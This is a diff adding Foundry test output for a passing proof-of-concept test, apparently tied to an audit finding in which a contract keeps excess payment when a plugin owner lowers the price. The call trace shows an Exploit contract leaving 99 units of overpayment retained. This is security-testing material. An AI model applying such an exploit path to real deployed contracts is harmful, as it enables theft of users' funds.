@@ -1,0 +1,35 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/53453-h-01-excess-payment-when-plugin-owner-reduces-price-shieldif_exp.sol:PoC_53453
+[PASS] test_exploit() (gas: 943249)
+Traces:
+  [943249] PoC_53453::test_exploit()
+    ├─ [494328] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 2469 bytes of code
+    ├─ [415687] Exploit::run()
+    │   ├─ [311342] → new Multicall@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─ [65396] → new Plugin@0x41C3c259514f88211c4CA2fd805A93F8F9A57504
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0: 0 → 1
+    │   │   │   └─ ← [Return] 216 bytes of code
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x00000000000000000000000041c3c259514f88211c4ca2fd805a93f8f9a57504
+    │   │   └─ ← [Return] 957 bytes of code
+    │   ├─ [24188] Multicall::click(1, 100)
+    │   │   ├─ [431] Plugin::getPrice() [staticcall]
+    │   │   │   └─ ← [Return] 1
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 99
+    │   │   └─ ← [Stop]
+    │   ├─ [403] Multicall::retained() [staticcall]
+    │   │   └─ ← [Return] 99
+    │   ├─ emit Proof(excess: 99)
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 1
+    │   │   @ 0: 0 → 99
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 365.29µs (183.54µs CPU time)
+
+Ran 1 test suite in 6.03ms (365.29µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
